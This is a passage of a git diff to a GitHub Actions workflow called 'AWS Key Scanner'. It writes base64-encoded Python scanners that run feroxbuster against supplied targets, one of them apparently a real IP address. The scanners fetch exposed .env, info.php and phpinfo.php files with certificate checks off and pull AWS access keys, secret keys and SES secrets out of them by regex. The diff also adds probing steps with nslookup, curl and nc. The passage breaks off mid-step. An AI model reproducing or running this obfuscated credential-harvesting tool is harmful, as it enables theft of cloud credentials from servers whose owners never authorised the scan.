@@ -1,4 +1,4 @@
-name: AWS Key Scanner
+name: AWS Key Scanner - Debug
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
       targets:
         description: "IP/domaines (virgules)"
         required: true
-        default: "98.92.70.139"
+        default: "example.com"
       wordlist_url:
         description: "URL wordlist"
         required: false
@@ -15,85 +15,97 @@ on:
 jobs:
   scan:
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    timeout-minutes: 30
     
     steps:
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: "3.10"
-      
-      - name: Show environment
+      - name: Setup
         run: |
-          echo "=== Environment Info ==="
-          uname -a
-          python --version
-          which python3
-          df -h
-          free -h
+          echo "=== Setup Info ==="
+          python3 --version
+          echo "Target: ${{ github.event.inputs.targets }}"
       
       - name: Install feroxbuster
         run: |
-          echo "Downloading feroxbuster..."
           wget https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.tar.gz
           tar -xzf x86_64-linux-feroxbuster.tar.gz
           chmod +x feroxbuster
           sudo mv feroxbuster /usr/local/bin/
-          echo "Feroxbuster installed:"
-          which feroxbuster
           feroxbuster --version
       
       - name: Download wordlist
         run: |
-          echo "Downloading wordlist from ${{ github.event.inputs.wordlist_url }}"
           wget -O wordlist.txt "${{ github.event.inputs.wordlist_url }}"
-          echo "Wordlist downloaded:"
-          ls -lh wordlist.txt
-          wc -l wordlist.txt
-          echo "First 10 lines:"
-          head -10 wordlist.txt
+          echo "Wordlist: $(wc -l wordlist.txt)"
+          echo "First 20 entries:"
+          head -20 wordlist.txt
       
-      - name: Create scanner
-        run: |
-          echo "aW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB1cmxsaWIuZXJyb3IKaW1wb3J0IHNzbAppbXBvcnQgb3MKaW1wb3J0IHJlCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKCnByaW50KCI9PT0gU2Nhbm5lciBTdGFydGVkID09PSIsIGZsdXNoPVRydWUpCnByaW50KGYiUHl0aG9uIHZlcnNpb246IHtzeXMudmVyc2lvbn0iLCBmbHVzaD1UcnVlKQpwcmludChmIkFyZ3VtZW50czoge3N5cy5hcmd2fSIsIGZsdXNoPVRydWUpCgpzc2xfY3R4ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF9jb250ZXh0KCkKYXdzX2FjY2Vzc19rZXlfcmVnZXggPSByZS5jb21waWxlKHInQUtJQVtBMC1aOV17MTZ9JykKc2VjcmV0X29yX3Nlc19yZWdleCA9IHJlLmNvbXBpbGUocidbXHcrLz1dezQwLDQ0fScpCgpkZWYgZXh0cmFjdF9rZXlzX2Zyb21fZW52KGNvbnRlbnQpOgogICAgbGluZXMgPSBjb250ZW50LnNwbGl0bGluZXMoKQogICAgcmVzdWx0cyA9IFtdCiAgICBmb3IgaWR4LCBsaW5lIGluIGVudW1lcmF0ZShsaW5lcyk6CiAgICAgICAgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGxpbmUpOgogICAgICAgICAgICBzdGFydCA9IG1heCgwLCBpZHggLSAzKQogICAgICAgICAgICBlbmQgPSBtaW4obGVuKGxpbmVzKSwgaWR4ICsgNCkKICAgICAgICAgICAgY29udGV4dF9saW5lcyA9IGxpbmVzW3N0YXJ0OmVuZF0KICAgICAgICAgICAgYWNjZXNzX2tleSA9IGF3c19hY2Nlc3Nfa2V5X3JlZ2V4LnNlYXJjaChsaW5lKS5ncm91cCgpCiAgICAgICAgICAgIHNlY3JldF9rZXkgPSBOb25lCiAgICAgICAgICAgIHNlc19zZWNyZXQgPSBOb25lCiAgICAgICAgICAgIGZvciBjb250ZXh0X2xpbmUgaW4gY29udGV4dF9saW5lczoKICAgICAgICAgICAgICAgIGlmICc9JyBpbiBjb250ZXh0X2xpbmU6CiAgICAgICAgICAgICAgICAgICAgXywgdmFsdWUgPSBjb250ZXh0X2xpbmUuc3BsaXQoJz0nLCAxKQogICAgICAgICAgICAgICAgICAgIHZhbHVlID0gdmFsdWUuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbih2YWx1ZSkgPT0gNDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlY3JldF9rZXkgPSB2YWx1ZQogICAgICAgICAgICAgICAgICAgIGVsaWYgbGVuKHZhbHVlKSA9PSA0NDoKICAgICAgICAgICAgICAgICAgICAgICAgc2VzX3NlY3JldCA9IHZhbHVlCiAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKHsiYWNjZXNzX2tleSI6IGFjY2Vzc19rZXksICJzZWNyZXRfa2V5Ijogc2VjcmV0X2tleSwgInNlc19zZWNyZXQiOiBzZXNfc2VjcmV0fSkKICAgIHJldHVybiByZXN1bHRzCgpkZWYgc2Nhbl90YXJnZXQodGFyZ2V0LCB3b3JkbGlzdCk6CiAgICBwcmludChmIlxuPT09IFN0YXJ0aW5nIHNjYW4gZm9yIHt0YXJnZXR9ID09PSIsIGZsdXNoPVRydWUpCiAgICAKICAgICMgVsOpcmlmaWVyIHF1ZSBmZXJveGJ1c3RlciBleGlzdGUKICAgIGZlcm94X2NoZWNrID0gc3VicHJvY2Vzcy5ydW4oWyd3aGljaCcsICdmZXJveGJ1c3RlciddLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpCiAgICBwcmludChmIkZlcm94YnVzdGVyIGxvY2F0aW9uOiB7ZmVyb3hfY2hlY2suc3Rkb3V0LnN0cmlwKCl9IiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgIyBWw6lyaWZpZXIgbGEgd29yZGxpc3QKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyh3b3JkbGlzdCk6CiAgICAgICAgcHJpbnQoZiJFUlJPUjogV29yZGxpc3Qgbm90IGZvdW5kOiB7d29yZGxpc3R9IiwgZmx1c2g9VHJ1ZSkKICAgICAgICByZXR1cm4gW10KICAgIAogICAgd29yZGxpc3Rfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZSh3b3JkbGlzdCkKICAgIHByaW50KGYiV29yZGxpc3Qgc2l6ZToge3dvcmRsaXN0X3NpemV9IGJ5dGVzIiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgIyBDb21wdGVyIGxlcyBsaWduZXMKICAgIHdpdGggb3Blbih3b3JkbGlzdCkgYXMgZjoKICAgICAgICBsaW5lX2NvdW50ID0gc3VtKDEgZm9yIF8gaW4gZikKICAgIHByaW50KGYiV29yZGxpc3QgZW50cmllczoge2xpbmVfY291bnR9IiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgdGFyZ2V0ID0gImh0dHA6Ly8iICsgdGFyZ2V0CiAgICBjbWQgPSBbImZlcm94YnVzdGVyIiwgIi11IiwgdGFyZ2V0LCAiLXciLCB3b3JkbGlzdCwgIi10IiwgIjUwIiwgIi1kIiwgIjEiLCAiLS10aW1lb3V0IiwgIjEwIl0KICAgIAogICAgcHJpbnQoZiJSdW5uaW5nOiB7JyAnLmpvaW4oY21kKX0iLCBmbHVzaD1UcnVlKQogICAgcHJpbnQoIlRoaXMgbWF5IHRha2UgMzAtNjAgc2Vjb25kcy4uLiIsIGZsdXNoPVRydWUpCiAgICAKICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFLCB0ZXh0PVRydWUpCiAgICBzdGRvdXRfZGF0YSwgc3RkZXJyX2RhdGEgPSBwcm9jLmNvbW11bmljYXRlKHRpbWVvdXQ9MzAwKQogICAgZWxhcHNlZCA9IHRpbWUudGltZSgpIC0gc3RhcnRfdGltZQogICAgCiAgICBwcmludChmIlxuRmVyb3hidXN0ZXIgY29tcGxldGVkIGluIHtlbGFwc2VkOi4xZn0gc2Vjb25kcyIsIGZsdXNoPVRydWUpCiAgICBwcmludChmIlJldHVybiBjb2RlOiB7cHJvYy5yZXR1cm5jb2RlfSIsIGZsdXNoPVRydWUpCiAgICAKICAgIGlmIHN0ZGVycl9kYXRhOgogICAgICAgIHByaW50KGYiU3RkZXJyOiB7c3RkZXJyX2RhdGFbOjUwMF19IiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgaWYgcHJvYy5yZXR1cm5jb2RlICE9IDA6CiAgICAgICAgcHJpbnQoZiJFUlJPUjogZmVyb3hidXN0ZXIgZmFpbGVkIHdpdGggY29kZSB7cHJvYy5yZXR1cm5jb2RlfSIsIGZsdXNoPVRydWUpCiAgICAgICAgcmV0dXJuIFtdCiAgICAKICAgIHByaW50KGYiU3Rkb3V0IGxlbmd0aDoge2xlbihzdGRvdXRfZGF0YSl9IGNoYXJzIiwgZmx1c2g9VHJ1ZSkKICAgIHByaW50KCJGaXJzdCA1MDAgY2hhcnMgb2Ygb3V0cHV0OiIsIGZsdXNoPVRydWUpCiAgICBwcmludChzdGRvdXRfZGF0YVs6NTAwXSwgZmx1c2g9VHJ1ZSkKICAgIAogICAgZGlycyA9IFtdCiAgICBmb3IgbGluZSBpbiBzdGRvdXRfZGF0YS5zcGxpdGxpbmVzKCk6CiAgICAgICAgbGluZSA9IGxpbmUuc3RyaXAoKQogICAgICAgIGlmIGxpbmUgYW5kICgnMjAwJyBpbiBsaW5lIG9yICdodHRwJyBpbiBsaW5lLmxvd2VyKCkpOgogICAgICAgICAgICBwYXJ0cyA9IGxpbmUuc3BsaXQoKQogICAgICAgICAgICBpZiBwYXJ0czoKICAgICAgICAgICAgICAgIHVybCA9IHBhcnRzWy0xXSBpZiBwYXJ0c1stMV0uc3RhcnRzd2l0aCgnaHR0cCcpIGVsc2UgTm9uZQogICAgICAgICAgICAgICAgaWYgdXJsOgogICAgICAgICAgICAgICAgICAgIGRpcnMuYXBwZW5kKHVybCkKICAgICAgICAgICAgICAgICAgICBwcmludChmIkZvdW5kOiB7dXJsfSIsIGZsdXNoPVRydWUpCiAgICAKICAgIHByaW50KGYiVG90YWwgZGlyZWN0b3JpZXMgZm91bmQ6IHtsZW4oZGlycyl9IiwgZmx1c2g9VHJ1ZSkKICAgIHJldHVybiBkaXJzCgpkZWYgY2hlY2tfZW5kcG9pbnRzKGRpcnMpOgogICAgcHJpbnQoZiJcbj09PSBDaGVja2luZyB7bGVuKGRpcnMpfSBlbmRwb2ludHMgPT09IiwgZmx1c2g9VHJ1ZSkKICAgIGZpbmRpbmdzID0gW10KICAgIAogICAgZm9yIGlkeCwgZGlyX3VybCBpbiBlbnVtZXJhdGUoZGlycyk6CiAgICAgICAgcHJpbnQoZiJcblt7aWR4KzF9L3tsZW4oZGlycyl9XSBDaGVja2luZyB7ZGlyX3VybH0iLCBmbHVzaD1UcnVlKQogICAgICAgIAogICAgICAgICMgQ2hlY2sgLmVudgogICAgICAgIGVudl91cmwgPSBkaXJfdXJsLnJzdHJpcCgiLyIpICsgIi8uZW52IgogICAgICAgIHRyeToKICAgICAgICAgICAgcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdChlbnZfdXJsLCBtZXRob2Q9IkdFVCIsIGhlYWRlcnM9eydVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wJ30pCiAgICAgICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsIGNvbnRleHQ9c3NsX2N0eCwgdGltZW91dD0xNSkgYXMgcmVzcDoKICAgICAgICAgICAgICAgIGlmIHJlc3AuZ2V0Y29kZSgpID09IDIwMDoKICAgICAgICAgICAgICAgICAgICBjb250ZW50ID0gcmVzcC5yZWFkKCkuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgICAgICAgICBwcmludChmIiAg4pyTIEZvdW5kIC5lbnYgKHtsZW4oY29udGVudCl9IGJ5dGVzKSIsIGZsdXNoPVRydWUpCiAgICAgICAgICAgICAgICAgICAgaWYgYXdzX2FjY2Vzc19rZXlfcmVnZXguc2VhcmNoKGNvbnRlbnQpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3VuZF9rZXlzID0gZXh0cmFjdF9rZXlzX2Zyb21fZW52KGNvbnRlbnQpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbmRpbmdzLmFwcGVuZCh7InVybCI6IGVudl91cmwsICJ0eXBlIjogIi5lbnYiLCAia2V5cyI6IGZvdW5kX2tleXN9KQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAg8J+UkSBBV1Mga2V5cyBmb3VuZCEiLCBmbHVzaD1UcnVlKQogICAgICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiICDinJcgLmVudiBIVFRQIHtlLmNvZGV9IiwgZmx1c2g9VHJ1ZSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiICDinJcgLmVudiBlcnJvcjoge3R5cGUoZSkuX19uYW1lX199IiwgZmx1c2g9VHJ1ZSkKICAgICAgICAKICAgICAgICAjIENoZWNrIGluZm8ucGhwCiAgICAgICAgZm9yIGluZm9fbmFtZSBpbiBbImluZm8ucGhwIiwgInBocGluZm8ucGhwIl06CiAgICAgICAgICAgIGluZm9fdXJsID0gZGlyX3VybC5yc3RyaXAoIi8iKSArICIvIiArIGluZm9fbmFtZQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXFfaW5mbyA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoaW5mb191cmwsIG1ldGhvZD0iR0VUIiwgaGVhZGVycz17J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAnfSkKICAgICAgICAgICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXFfaW5mbywgY29udGV4dD1zc2xfY3R4LCB0aW1lb3V0PTE1KSBhcyByZXNwOgogICAgICAgICAgICAgICAgICAgIGlmIHJlc3AuZ2V0Y29kZSgpID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgaW5mb19jb250ZW50ID0gcmVzcC5yZWFkKCkuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiIgIOKckyBGb3VuZCB7aW5mb19uYW1lfSAoe2xlbihpbmZvX2NvbnRlbnQpfSBieXRlcykiLCBmbHVzaD1UcnVlKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBhd3NfYWNjZXNzX2tleV9yZWdleC5zZWFyY2goaW5mb19jb250ZW50KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbmRpbmdzLmFwcGVuZCh7InVybCI6IGluZm9fdXJsLCAidHlwZSI6IGluZm9fbmFtZX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIiAg8J+UkSBBV1Mga2V5cyBmb3VuZCBpbiB7aW5mb19uYW1lfSEiLCBmbHVzaD1UcnVlKQogICAgICAgICAgICBleGNlcHQgdXJsbGliLmVycm9yLkhUVFBFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoZiIgIOKclyB7aW5mb19uYW1lfSBIVFRQIHtlLmNvZGV9IiwgZmx1c2g9VHJ1ZSkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoZiIgIOKclyB7aW5mb19uYW1lfSBlcnJvcjoge3R5cGUoZSkuX19uYW1lX199IiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgcmV0dXJuIGZpbmRpbmdzCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcHJpbnQoZiJTY3JpcHQgc3RhcnRlZCBhdDoge3RpbWUuc3RyZnRpbWUoJyVZLSVtLSVkICVIOiVNOiVTJyl9IiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgaWYgbGVuKHN5cy5hcmd2KSA8IDM6CiAgICAgICAgcHJpbnQoIkVSUk9SOiBNaXNzaW5nIGFyZ3VtZW50cyIsIGZsdXNoPVRydWUpCiAgICAgICAgcHJpbnQoIlVzYWdlOiBweXRob24gc2Nhbm5lci5weSB0YXJnZXRzIHdvcmRsaXN0LnR4dCIsIGZsdXNoPVRydWUpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIAogICAgdGFyZ2V0cyA9IHN5cy5hcmd2WzFdLnNwbGl0KCIsIikKICAgIHdvcmRsaXN0ID0gc3lzLmFyZ3ZbMl0KICAgIAogICAgcHJpbnQoZiJUYXJnZXRzOiB7dGFyZ2V0c30iLCBmbHVzaD1UcnVlKQogICAgcHJpbnQoZiJXb3JkbGlzdDoge3dvcmRsaXN0fSIsIGZsdXNoPVRydWUpCiAgICAKICAgIGFsbF9maW5kaW5ncyA9IFtdCiAgICBmb3IgdGFyZ2V0IGluIHRhcmdldHM6CiAgICAgICAgdGFyZ2V0ID0gdGFyZ2V0LnN0cmlwKCkKICAgICAgICBkaXJzID0gc2Nhbl90YXJnZXQodGFyZ2V0LCB3b3JkbGlzdCkKICAgICAgICBmaW5kaW5ncyA9IGNoZWNrX2VuZHBvaW50cyhkaXJzKQogICAgICAgIGFsbF9maW5kaW5ncy5leHRlbmQoZmluZGluZ3MpCiAgICAKICAgIHByaW50KGYiXG49PT0gRmluYWwgUmVzdWx0cyA9PT0iLCBmbHVzaD1UcnVlKQogICAgcHJpbnQoanNvbi5kdW1wcyhhbGxfZmluZGluZ3MsIGluZGVudD0yKSwgZmx1c2g9VHJ1ZSkKICAgIAogICAgd2l0aCBvcGVuKCJyZXN1bHRzLmpzb24iLCAidyIpIGFzIGY6CiAgICAgICAganNvbi5kdW1wKGFsbF9maW5kaW5ncywgZiwgaW5kZW50PTIpCiAgICAKICAgIHByaW50KGYiXG5TY3JpcHQgY29tcGxldGVkIGF0OiB7dGltZS5zdHJmdGltZSgnJVktJW0tJWQgJUg6JU06JVMnKX0iLCBmbHVzaD1UcnVlKQogICAgcHJpbnQoZiJUb3RhbCBmaW5kaW5nczoge2xlbihhbGxfZmluZGluZ3MpfSIsIGZsdXNoPVRydWUpCg==" | base64 -d > scanner.py
-          echo "Scanner created:"
-          ls -lh scanner.py
-          echo "First 20 lines:"
-          head -20 scanner.py
+      - name: Create test scanner
+        run: echo "aW1wb3J0IGpzb24KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB1cmxsaWIuZXJyb3IKaW1wb3J0IHNzbAppbXBvcnQgc3lzCmltcG9ydCB0aW1lCgpwcmludCgiPT09IFNpbXBsZSBTY2FubmVyIFRlc3QgPT09IiwgZmx1c2g9VHJ1ZSkKCnNzbF9jdHggPSBzc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQoKQoKZGVmIHRlc3RfZmVyb3hidXN0ZXIodGFyZ2V0LCB3b3JkbGlzdCk6CiAgICAiIiJUZXN0IGZlcm94YnVzdGVyIGF2ZWMgdmVyYm9zZSBvdXRwdXQiIiIKICAgIHByaW50KGYiXG49PT0gVGVzdGluZyBmZXJveGJ1c3RlciBvbiB7dGFyZ2V0fSA9PT0iLCBmbHVzaD1UcnVlKQogICAgCiAgICBjbWQgPSBbImZlcm94YnVzdGVyIiwgIi11IiwgZiJodHRwOi8ve3RhcmdldH0iLCAiLXciLCB3b3JkbGlzdCwgIi12IiwgIi10IiwgIjIwIl0KICAgIHByaW50KGYiQ29tbWFuZDogeycgJy5qb2luKGNtZCl9IiwgZmx1c2g9VHJ1ZSkKICAgIAogICAgc3RhcnQgPSB0aW1lLnRpbWUoKQogICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHRleHQ9VHJ1ZSkKICAgIAogICAgIyBBZmZpY2hlciBvdXRwdXQgZW4gdGVtcHMgcsOpZWwKICAgIG91dHB1dF9saW5lcyA9IFtdCiAgICBmb3IgbGluZSBpbiBpdGVyKHByb2Muc3Rkb3V0LnJlYWRsaW5lLCAnJyk6CiAgICAgICAgaWYgbGluZToKICAgICAgICAgICAgcHJpbnQoZiJGRVJPWDoge2xpbmUucnN0cmlwKCl9IiwgZmx1c2g9VHJ1ZSkKICAgICAgICAgICAgb3V0cHV0X2xpbmVzLmFwcGVuZChsaW5lKQogICAgCiAgICBwcm9jLndhaXQoKQogICAgZWxhcHNlZCA9IHRpbWUudGltZSgpIC0gc3RhcnQKICAgIAogICAgcHJpbnQoZiJcbkZlcm94YnVzdGVyIGZpbmlzaGVkIGluIHtlbGFwc2VkOi4xZn1zIHdpdGggY29kZSB7cHJvYy5yZXR1cm5jb2RlfSIsIGZsdXNoPVRydWUpCiAgICBwcmludChmIlRvdGFsIG91dHB1dCBsaW5lczoge2xlbihvdXRwdXRfbGluZXMpfSIsIGZsdXNoPVRydWUpCiAgICAKICAgIHJldHVybiBvdXRwdXRfbGluZXMKCmRlZiB0ZXN0X2RpcmVjdF9yZXF1ZXN0cyh0YXJnZXQpOgogICAgIiIiVGVzdCBkaXJlY3Qgc2FucyBmZXJveGJ1c3RlciIiIgogICAgcHJpbnQoZiJcbj09PSBUZXN0aW5nIGRpcmVjdCByZXF1ZXN0cyB0byB7dGFyZ2V0fSA9PT0iLCBmbHVzaD1UcnVlKQogICAgCiAgICB0ZXN0X3BhdGhzID0gWwogICAgICAgICIvIiwKICAgICAgICAiLy5lbnYiLAogICAgICAgICIvaW5mby5waHAiLAogICAgICAgICIvcGhwaW5mby5waHAiLAogICAgICAgICIvYWRtaW4iLAogICAgICAgICIvYmFja3VwIiwKICAgICAgICAiL3Rlc3QiCiAgICBdCiAgICAKICAgIGZpbmRpbmdzID0gW10KICAgIAogICAgZm9yIHBhdGggaW4gdGVzdF9wYXRoczoKICAgICAgICB1cmwgPSBmImh0dHA6Ly97dGFyZ2V0fXtwYXRofSIKICAgICAgICBwcmludChmIlxuVHJ5aW5nOiB7dXJsfSIsIGZsdXNoPVRydWUpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KAogICAgICAgICAgICAgICAgdXJsLAogICAgICAgICAgICAgICAgbWV0aG9kPSJHRVQiLAogICAgICAgICAgICAgICAgaGVhZGVycz17J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAnfQogICAgICAgICAgICApCiAgICAgICAgICAgIAogICAgICAgICAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCBjb250ZXh0PXNzbF9jdHgsIHRpbWVvdXQ9MTApIGFzIHJlc3A6CiAgICAgICAgICAgICAgICBzdGF0dXMgPSByZXNwLmdldGNvZGUoKQogICAgICAgICAgICAgICAgY29udGVudF9sZW5ndGggPSBsZW4ocmVzcC5yZWFkKCkpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHByaW50KGYiICDinJMgSFRUUCB7c3RhdHVzfSAtIHtjb250ZW50X2xlbmd0aH0gYnl0ZXMiLCBmbHVzaD1UcnVlKQogICAgICAgICAgICAgICAgZmluZGluZ3MuYXBwZW5kKHsKICAgICAgICAgICAgICAgICAgICAidXJsIjogdXJsLAogICAgICAgICAgICAgICAgICAgICJzdGF0dXMiOiBzdGF0dXMsCiAgICAgICAgICAgICAgICAgICAgInNpemUiOiBjb250ZW50X2xlbmd0aAogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiICDinJcgSFRUUCB7ZS5jb2RlfSIsIGZsdXNoPVRydWUpCiAgICAgICAgZXhjZXB0IHVybGxpYi5lcnJvci5VUkxFcnJvciBhcyBlOgogICAgICAgICAgICBwcmludChmIiAg4pyXIENvbm5lY3Rpb24gZXJyb3I6IHtlLnJlYXNvbn0iLCBmbHVzaD1UcnVlKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiIgIOKclyBFcnJvcjoge3R5cGUoZSkuX19uYW1lX199OiB7ZX0iLCBmbHVzaD1UcnVlKQogICAgCiAgICByZXR1cm4gZmluZGluZ3MKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBwcmludChmIkFyZ3VtZW50czoge3N5cy5hcmd2fSIsIGZsdXNoPVRydWUpCiAgICAKICAgIGlmIGxlbihzeXMuYXJndikgPCAzOgogICAgICAgIHByaW50KCJVc2FnZTogcHl0aG9uIHNjYW5uZXIucHkgdGFyZ2V0IHdvcmRsaXN0LnR4dCIsIGZsdXNoPVRydWUpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIAogICAgdGFyZ2V0ID0gc3lzLmFyZ3ZbMV0uc3BsaXQoIiwiKVswXS5zdHJpcCgpCiAgICB3b3JkbGlzdCA9IHN5cy5hcmd2WzJdCiAgICAKICAgIHByaW50KGYiXG5UYXJnZXQ6IHt0YXJnZXR9IiwgZmx1c2g9VHJ1ZSkKICAgIHByaW50KGYiV29yZGxpc3Q6IHt3b3JkbGlzdH0iLCBmbHVzaD1UcnVlKQogICAgCiAgICAjIFRlc3QgMTogRGlyZWN0IHJlcXVlc3RzCiAgICBwcmludCgiXG4iICsgIj0iKjUwLCBmbHVzaD1UcnVlKQogICAgcHJpbnQoIlRFU1QgMTogRGlyZWN0IEhUVFAgcmVxdWVzdHMiLCBmbHVzaD1UcnVlKQogICAgcHJpbnQoIj0iKjUwLCBmbHVzaD1UcnVlKQogICAgZGlyZWN0X2ZpbmRpbmdzID0gdGVzdF9kaXJlY3RfcmVxdWVzdHModGFyZ2V0KQogICAgCiAgICAjIFRlc3QgMjogRmVyb3hidXN0ZXIKICAgIHByaW50KCJcbiIgKyAiPSIqNTAsIGZsdXNoPVRydWUpCiAgICBwcmludCgiVEVTVCAyOiBGZXJveGJ1c3RlciBzY2FuIiwgZmx1c2g9VHJ1ZSkKICAgIHByaW50KCI9Iio1MCwgZmx1c2g9VHJ1ZSkKICAgIGZlcm94X291dHB1dCA9IHRlc3RfZmVyb3hidXN0ZXIodGFyZ2V0LCB3b3JkbGlzdCkKICAgIAogICAgIyBSZXN1bHRzCiAgICByZXN1bHRzID0gewogICAgICAgICJ0YXJnZXQiOiB0YXJnZXQsCiAgICAgICAgImRpcmVjdF9yZXF1ZXN0cyI6IGRpcmVjdF9maW5kaW5ncywKICAgICAgICAiZmVyb3hidXN0ZXJfbGluZXMiOiBsZW4oZmVyb3hfb3V0cHV0KSwKICAgICAgICAiZmVyb3hidXN0ZXJfc2FtcGxlIjogZmVyb3hfb3V0cHV0WzoxMF0gaWYgZmVyb3hfb3V0cHV0IGVsc2UgW10KICAgIH0KICAgIAogICAgcHJpbnQoIlxuIiArICI9Iio1MCwgZmx1c2g9VHJ1ZSkKICAgIHByaW50KCJGSU5BTCBSRVNVTFRTIiwgZmx1c2g9VHJ1ZSkKICAgIHByaW50KCI9Iio1MCwgZmx1c2g9VHJ1ZSkKICAgIHByaW50KGpzb24uZHVtcHMocmVzdWx0cywgaW5kZW50PTIpLCBmbHVzaD1UcnVlKQogICAgCiAgICB3aXRoIG9wZW4oInJlc3VsdHMuanNvbiIsICJ3IikgYXMgZjoKICAgICAgICBqc29uLmR1bXAocmVzdWx0cywgZiwgaW5kZW50PTIpCiAgICAKICAgIHByaW50KGYiXG5SZXN1bHRzIHNhdmVkIHRvIHJlc3VsdHMuanNvbiIsIGZsdXNoPVRydWUpCg==" | base64 -d > scanner.py
       
-      - name: Test connectivity
+      - name: Test target connectivity
         run: |
-          echo "Testing target connectivity..."
           TARGET=$(echo "${{ github.event.inputs.targets }}" | cut -d',' -f1)
-          echo "Testing: $TARGET"
-          ping -c 3 $TARGET || echo "Ping failed (maybe blocked)"
-          curl -I --connect-timeout 10 http://$TARGET || echo "HTTP connection failed"
+          echo "=== Testing $TARGET ==="
+          
+          # DNS resolution
+          echo "DNS lookup:"
+          nslookup $TARGET || echo "DNS failed"
+          
+          # Ping
+          echo -e "\nPing test:"
+          ping -c 3 $TARGET || echo "Ping failed (may be blocked)"
+          
+          # HTTP test
+          echo -e "\nHTTP test:"
+          curl -v --connect-timeout 10 http://$TARGET 2>&1 | head -30
+          
+          # Port 80 check
+          echo -e "\nPort 80 check:"
+          nc -zv -w 5 $TARGET 80 2>&1 || echo "Port 80 closed/filtered"
       
-      - name: Run scan
+      - name: Manual feroxbuster test
         run: |
-          echo "=== Starting Scan ==="
-          echo "Targets: ${{ github.event.inputs.targets }}"
-          python scanner.py "${{ github.event.inputs.targets }}" wordlist.txt
-          echo "=== Scan Completed ==="
+          TARGET=$(echo "${{ github.event.inputs.targets }}" | cut -d',' -f1)
+          echo "=== Manual feroxbuster test ==="
+          
+          # Test avec seulement 10 entrées
+          head -10 wordlist.txt > small_wordlist.txt
+          
+          echo "Testing with small wordlist (10 entries):"
+          cat small_wordlist.txt
+          
+          echo -e "\nRunning feroxbuster..."
+          timeout 60s feroxbuster \
+            -u http://$TARGET \
+            -w small_wordlist.txt \
+            -t 10 \
+            -d 1 \
+            --timeout 5 \
+            -v || echo "Feroxbuster finished with code $?"
+      
+      - name: Run full scanner
+        run: |
+          echo "=== Running full scanner ==="
+          python3 scanner.py "${{ github.event.inputs.targets }}" wordlist.txt
+      
+      - name: Show all results
+        if: always()
+        run: |
+          echo "=== All files created ==="
+          ls -lah
+          
+          echo -e "\n=== Results ==="
+          if [ -f results.json ]; then
